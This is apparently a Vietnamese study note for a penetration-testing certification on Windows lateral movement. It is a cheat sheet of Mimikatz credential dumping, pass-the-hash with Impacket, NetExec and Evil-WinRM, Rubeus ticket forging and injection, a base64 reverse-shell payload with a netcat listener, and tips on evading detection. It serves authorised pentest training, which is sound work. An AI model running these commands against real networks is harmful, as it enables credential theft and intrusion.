---
title: "Windows Lateral Movement"
date: 2026-04-13 20:28:48 +0700
categories: [HTB_CPTS, Post-Exploitation]
tags: [lateral-movement, windows, smb, active-directory]
description: "HTB CPTS note về các kỹ thuật Windows lateral movement trong pentest nội bộ."
pin: false
---
> **Overview Các kỹ thuật di chuyển ngang trong mạng sau khi đã compromise được 1 máy. Mục tiêu: dùng credentials/hashes đã thu thập để truy cập các máy khác trong domain/subnet.**

---
## 📂 Table of Contents

- 🔑 Pass the Hash (PtH)
- 🗝️ OverPass the Hash (Pass the Key)
- 🎟️ Pass the Ticket (PtT)
- 🪪 Kerberos Double Hop Problem
- 🛠️ Remote Code Execution

---
## 🔑 Pass the Hash (PtH)

> **Khái niệm Dùng **NTLM hash** thay cho password plaintext để xác thực — **không cần crack hash**. Hoạt động được vì NTLM không salt hash → cùng hash = cùng quyền truy cập cho đến khi đổi password.**

> **Lấy hash từ đâu?**
>
> - Dump SAM database (local machine)
> - Extract từ NTDS.dit (Domain Controller)
> - Pull từ LSASS memory

---
### Từ Windows

#### Mimikatz — Dump credential trong LSASS memory

```cmd
privilege::debug
sekurlsa::logonpasswords
```
#### Mimikatz — Spawn process với identity mới

```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<user> /rc4:<hash> /domain:<domain> /run:cmd.exe" exit
```

|Option|Giải thích|
|---|---|
|`/user`|Username muốn impersonate|
|`/rc4` hoặc `/NTLM`|NTLM hash của user|
|`/domain`|Domain (local account dùng `.` hoặc `localhost`)|
|`/run`|Process chạy với context của user (default: `cmd.exe`)|

> **Cơ chế: Mimikatz spawn cmd.exe mới và inject hash vào memory → mọi lệnh trong cmd đó mang identity của user đó, dù không biết password thật**

#### Invoke-TheHash (PowerShell) — Thực thi lệnh qua SMB/WMI

```powershell
Import-Module .\Invoke-TheHash.psd1

# SMB — execute command
Invoke-SMBExec -Target <ip> -Domain <domain> -Username <user> -Hash <hash> -Command "<cmd>" -Verbose

# WMI — gửi reverse shell
Invoke-WMIExec -Target <hostname> -Domain <domain> -Username <user> -Hash <hash> -Command "powershell -e <base64_payload>"
```

> **Không cần local admin trên **máy mình** — chỉ cần user/hash có admin rights trên **target****

> **Reverse shell payload: generate từ revshells.com → PowerShell #3 (Base64). Listener: `.\nc.exe -lvnp 8001`**

---
### Từ Linux

#### Impacket PsExec — Interactive shell

```bash
impacket-psexec <user>@<ip> -hashes :<NT_hash>
```

> **Format: `LM:NTLM` — LM để trống, chỉ cần NT hash sau dấu `:`. Cơ chế: upload `.exe` lên `ADMIN$` → tạo Windows Service → lấy shell → tự xóa**

Các tool tương tự: `impacket-wmiexec`, `impacket-atexec`, `impacket-smbexec`

#### NetExec — Spray toàn subnet + kiểm tra password reuse

```bash
# Spray toàn subnet với domain account
netexec smb 172.16.1.0/24 -u Administrator -d . -H <hash>

# Spray với local account
netexec smb 172.16.1.0/24 -u Administrator -H <hash> --local-auth

# Execute command
netexec smb <ip> -u Administrator -d . -H <hash> -x whoami
```

|Option|Giải thích|
|---|---|
|`-d .`|Local account (`.` = không thuộc domain)|
|`--local-auth`|Authenticate là local account thay vì domain account|
|`-x <cmd>`|Execute command sau khi PtH thành công|
|`Pwn3d!`|User là **local admin** trên máy đó|

> **Password Reuse: Nhiều tổ chức dùng **gold image** → clone nhiều máy với cùng local admin password. Dump SAM 1 máy → `--local-auth` spray toàn subnet → chiếm hàng loạt. Phòng thủ: triển khai **LAPS** để randomize + rotate password riêng từng máy.**

#### Evil-WinRM — Khi SMB bị block

```bash
# Local account
evil-winrm -i <ip> -u Administrator -H <hash>

# Domain account
evil-winrm -i <ip> -u administrator@<domain> -H <hash>
```

#### xfreerdp — GUI access qua RDP

```bash
xfreerdp /v:<ip> /u:<user> /pth:<hash>
```

> **Cần enable **Restricted Admin Mode** trên target trước:**
>
> ```cmd
> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
> ```

---
### UAC giới hạn PtH với Local Accounts

|Registry Key|Value|Ý nghĩa|
|---|---|---|
|`LocalAccountTokenFilterPolicy`|`0` (default)|Chỉ **RID-500** (built-in Administrator) PtH được|
|`LocalAccountTokenFilterPolicy`|`1`|Tất cả local admin accounts PtH được|
|`FilterAdministratorToken`|`1`|Ngay cả RID-500 cũng bị chặn|

> **Giới hạn này **chỉ với local accounts**. Domain account có admin rights → PtH bình thường.**

---
### Chọn tool theo tình huống

```
Đang trên Windows?
├── Spawn process với identity mới        → Mimikatz sekurlsa::pth
└── Execute command / reverse shell       → Invoke-TheHash (SMB/WMI)

Đang trên Linux?
├── Interactive shell                     → impacket-psexec
├── Spray toàn subnet / check reuse       → netexec --local-auth
├── SMB bị block                          → evil-winrm
└── Cần GUI                               → xfreerdp /pth
```

---
## 🗝️ OverPass the Hash (Pass the Key)

> **Khái niệm Chuyển đổi **NTLM hash / AES key** của user thành **TGT Kerberos hợp lệ** — thay vì xác thực NTLM trực tiếp như PtH. Kết quả: impersonate user thông qua Kerberos dù không biết password thật.**

> **Hai cách dùng**
>
> - **Vector độc lập**: Spawn process mới với identity của user thông qua Kerberos (mục tiêu chính)
> - **Bridge dẫn vào PtT**: Forge TGT xong inject vào session → thực hiện lateral movement theo kiểu PtT

---
### Lấy Kerberos keys — Mimikatz (cần admin)

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
# → Thu được aes256_hmac, rc4_hmac_nt của từng user
```

---
### Cách 1: Mimikatz — Spawn process mới (cần admin)

```cmd
mimikatz # sekurlsa::pth /domain:<domain> /user:<user> /ntlm:<hash>
# → Mở cmd.exe mới chạy trong context của user
# → Dùng cmd.exe đó để truy cập resource hoặc xin TGT thủ công
```

> **Kết quả tương tự PtH nhưng process mới xác thực qua Kerberos — có thể xin TGT từ DC bình thường.**

---
### Cách 2: Rubeus — Forge TGT trực tiếp (không cần admin)

```cmd
# Dùng AES256 — ưu tiên, ít bị detect hơn
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<hash> /nowrap

# Dùng RC4/NTLM — có thể bị cảnh báo "encryption downgrade"
Rubeus.exe asktgt /domain:<domain> /user:<user> /rc4:<hash> /nowrap
```

> **Domain 2008+ dùng AES mặc định. Dùng RC4 thay AES → DC log cảnh báo **encryption downgrade** → dễ bị defender phát hiện. Luôn ưu tiên AES256 nếu có.**

---
### Dùng làm bridge cho PtT

Thêm `/ptt` để forge TGT xong inject luôn vào session — từ đây thực hiện lateral movement như PtT:

```cmd
Rubeus.exe asktgt /domain:<domain> /user:<user> /aes256:<hash> /ptt
# → Forge TGT + inject vào session trong một bước
# → Tiếp tục dùng như PtT bình thường
```

---
### So sánh PtH vs OverPass the Hash

|Tiêu chí|PtH|OverPass the Hash|
|---|---|---|
|**Input**|NTLM hash|NTLM hash / AES key|
|**Giao thức**|NTLM|Kerberos|
|**Output**|Xác thực trực tiếp|TGT (có thể tiếp tục dùng cho PtT)|
|**Noise**|Event 4624 Logon type 3|Thấp hơn, giống user thật hơn|
|**Cần admin**|Mimikatz: có / Impacket: không|Mimikatz: có / Rubeus: không|

---
## 🎟️ Pass the Ticket (PtT)

> **Khái niệm Dùng **Kerberos ticket** bị đánh cắp (hoặc được forge bởi OverPass the Hash) để di chuyển ngang — không cần hash hay password. Ticket được lưu trong tiến trình **LSASS**, cần quyền local admin để dump ticket của người khác.**

> **Khi nào dùng PtT thay PtH?**
>
> - Target chỉ chấp nhận Kerberos (không dùng NTLM)
> - Muốn ít noise hơn với defender
> - Truy cập target qua **hostname/FQDN** thay vì IP

---
### Kerberos Refresher

|Ticket|Vai trò|
|---|---|
|**TGT** (Ticket Granting Ticket)|Ticket "mẹ" — dùng để xin các TGS khác. Nhận diện: có `krbtgt` trong tên file|
|**TGS** (Ticket Granting Service)|Ticket "con" — dùng để truy cập service cụ thể (cifs, ldap, http...)|

**Luồng Kerberos:**

```
User authenticate với DC → DC cấp TGT
→ Muốn dùng service? → Xuất trình TGT → DC cấp TGS
→ Dùng TGS kết nối service
```

**Đọc tên file `.kirbi`:**

|Dấu hiệu trong tên file|Ý nghĩa|
|---|---|
|`krbtgt`|✅ TGT của user đó|
|`cifs`, `ldap`, `http`...|TGS cho service cụ thể|
|Có `$` trong tên user|Ticket của computer account (ít giá trị)|

> **Ưu tiên tìm file có `krbtgt` — đây là TGT, linh hoạt nhất: có thể xin TGS cho mọi service user có quyền.**

---
### Bước 1 — Thu thập Ticket

#### Mimikatz — Export ra file `.kirbi` (cần admin)

```cmd
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export

dir *.kirbi
```

> **Bug: Mimikatz v2.2.0 trên một số Windows 10 export ticket bị lỗi mã hoá. Nên dùng Rubeus thay thế.**

#### Rubeus — Export dạng Base64 (không cần admin)

```cmd
Rubeus.exe dump /nowrap
```

> **Không có admin → `Rubeus dump` chỉ thấy ticket của **user hiện tại**, không thấy ticket của user khác. Muốn dump ticket của user khác → cần **privilege escalation** trước.**

---
### Bước 2 — Inject Ticket vào Session

#### Rubeus — Inject từ file `.kirbi`

```cmd
Rubeus.exe ptt /ticket:<tên_file>.kirbi
```

#### Rubeus — Inject từ Base64

```powershell
# Chuyển .kirbi sang Base64
[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
```

```cmd
Rubeus.exe ptt /ticket:doIE1jCC...
```

#### Mimikatz — Inject từ file `.kirbi`

```cmd
mimikatz # kerberos::ptt "C:\path\to\ticket.kirbi"
mimikatz # exit

# Hoặc mở cmd mới với ticket luôn
mimikatz # misc::cmd
```

#### Kiểm tra ticket đã inject

```cmd
klist
```

---
### Bước 3 — Lateral Movement thực tế

```cmd
# PHẢI dùng hostname, không dùng IP
dir \\DC01.inlanefreight.htb\c$

# Hoặc đọc file qua SMB trực tiếp
type \\DC01\<share>\file.txt
```

> **Hostname → Kerberos ✅ | IP address → fallback NTLM ❌ (ticket vô dụng)**

---
### PowerShell Remoting với PtT

WinRM chạy trên port **5985** (HTTP) / **5986** (HTTPS). Yêu cầu: local admin hoặc thuộc nhóm **Remote Management Users**.

#### Cách 1: Mimikatz

```cmd
mimikatz # kerberos::ptt "ticket.kirbi"
mimikatz # exit

powershell
PS> Enter-PSSession -ComputerName DC01
[DC01]: PS> whoami
```

#### Cách 2: Rubeus + createnetonly (sạch hơn, không ảnh hưởng session hiện tại)

```cmd
# Tạo sacrificial process — logon session riêng biệt (Logon type 9)
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show

# Trong cmd mới đó, forge TGT và inject
Rubeus.exe asktgt /user:<user> /domain:<domain> /aes256:<hash> /ptt

# Kết nối remote
powershell
PS> Enter-PSSession -ComputerName DC01
```

> **`createnetonly` tạo session cô lập (tương đương `runas /netonly`) — tránh ghi đè TGT hiện tại của session đang dùng.**

---
### Chọn kỹ thuật theo tình huống

```
Đã có ticket Kerberos               → PtT trực tiếp
Chỉ có hash, muốn dùng Kerberos     → OverPass the Hash /ptt → PtT
Có NTLM hash, target qua IP         → Pass the Hash

Khi inject ticket:
├── Không quan tâm session hiện tại  → Mimikatz kerberos::ptt
└── Muốn giữ session hiện tại sạch  → Rubeus createnetonly + asktgt /ptt
```

---

### So sánh noise level

|Kỹ thuật|Event sinh ra|Khả năng bị detect|
|---|---|---|
|PtH (NTLM)|Event 4624 Logon type 3|Cao|
|PtT (Kerberos)|Traffic Kerberos bình thường|Thấp|
|OverPass Hash dùng RC4|Encryption downgrade warning|Trung bình|
|OverPass Hash dùng AES256|Giống user thật|Thấp nhất|

---
